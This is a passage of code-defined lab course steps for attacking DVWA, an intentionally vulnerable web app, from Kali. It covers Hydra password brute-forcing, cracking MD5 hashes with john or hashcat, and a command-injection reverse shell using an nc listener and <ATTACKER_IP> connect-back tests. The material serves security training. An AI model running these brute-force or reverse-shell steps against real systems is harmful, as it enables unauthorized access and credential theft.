...
1 of 1 target successfully completed, 1 valid password found`,
        ...
        isEvidenceStep: true,
        verify: ['login: admin'],
        troubleshooting: '"Found" password will not log you in? You aimed at /login.php — its per-request user_token (CSRF) makes hydra hits false. Use /vulnerabilities/brute/ with your cookie (above). Hydra says EVERY password works? Your PHPSESSID/security cookie is wrong or expired, or the F= text does not match — open the page, submit a bad password, and copy the exact "Username and/or password incorrect" text. rockyou.txt "No such file"? It is gzipped: sudo gunzip /usr/share/wordlists/rockyou.txt.gz. Got a HASH from the SQL-injection dump instead of a password? Those are unsalted MD5 — crack them: save the hash to a file and run john --format=raw-md5 hash.txt (or hashcat -m 0). DVWA admin\'s hash 5f4dcc3b5aa765d61d8327deb882cf99 = "password".',
      },
      {
        id: 'red-w3-s3',
        title: 'Command Injection & Reverse Shell',
        description: 'Catch a shell from the target using a command-injection payload.',
        instruction: 'A TWO-WINDOW attack. IMPORTANT: DVWA usually runs in a MINIMAL Docker container with NO nc and NO bash — so the PHP payload (command 4) is the one that reliably works; the nc/bash payloads (5, 6) are fallbacks only if the container has them.\n① KALI TERMINAL — start the listener (command 2) and leave it running.\n② BROWSER — DVWA (Security = Low) → Command Injection → "Enter an IP address" box: first run command 3 to see what the container has, then paste ONE payload (4, or fallback 5/6) and Submit. The page hangs while the shell is open — that is normal, look at your listener.\n③ KALI TERMINAL — the shell lands in your listener: run id, then save it + notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
          {
            cmd: 'nc -lvnp 4444',
...
dvwa-target`,
        ...
        isEvidenceStep: true,
        verify: ['uid='],
        troubleshooting: 'Ran a payload but no shell? 99% of the time the container lacks that tool — run command 3 (which nc bash python3 php) and use the PHP payload; DVWA containers ship PHP but usually not nc or bash. Put YOUR Kali IP in <ATTACKER_IP> (find it with ip a) — 127.0.0.1 or the container IP will NOT work. The browser tab hangs while the shell is live — that is expected; watch your listener. Nothing arrives at all? The container must reach your Kali — from the Docker HOST test: nc <ATTACKER_IP> 4444 or ping <ATTACKER_IP>. Make sure DVWA Security = Low (Medium/High strip the ; ). Keep port 4444 free ("Address already in use" → find it with jobs, stop with kill %1).',
      },
      {
        id: 'red-w3-msf',
